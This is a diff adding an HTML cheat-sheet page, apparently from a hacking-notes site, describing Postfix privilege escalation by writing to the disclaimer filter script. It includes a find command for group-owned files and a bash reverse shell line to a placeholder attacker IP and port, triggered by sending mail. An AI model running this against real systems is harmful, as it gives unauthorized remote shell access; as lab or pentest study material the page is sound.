@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Postfix</h1>
+            <p>Postfix is a free and open-source mail transfer agent (MTA) that handles the sending and receiving of email messages on a Linux system</p>
+        </div>
+        <div class="notion-body">
+            <h2>Privilege escalation</h2>
+            <ul>
+                <p>First check if you are in a group named "filter" or similar</p>
+                <p>Check which files are owned by the group:</p>
+                <pre><code class="language-bash">find / -group filter 2>/dev/null</code></pre>
+                <p>In case you found those files you are lucky</p>
+                <pre><code class="language-bash">/etc/postfix/disclaimer 
+/var/spool/filter</code></pre>
+                <p>Then check which of those files are being used looking at the master.cnf</p>    
+                <pre><code class="language-bash">cat /etc/postfix/master.cf | grep disclaimer</code></pre>
+                <p>The result should be:</p>
+                <pre><code class="language-bash">dfilt      unix  -       n       n       -       -       pipe flags=Rq user=filter argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}</code></pre>   
+                <p>In the previous output we can see that the disclaimer script is executed since it's configured in the file. So we could attempt to modify the file and inject our code</p>
+                <p>At the beggining of the file, we can add our reverse shell payload. It is recommended to use a simple reverse shell since we don't know if the postfix user has root privielges:</p>
+                <pre><code class="language-bash">bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1</code></pre>
+                <b>In order to complete te exploit we need to send a mail with the any of the users present in the the following file /etc/postfix/disclaimer_addresses</b>   
+            </ul>    
+        </div>
+    </div>
+</body>
+</html>
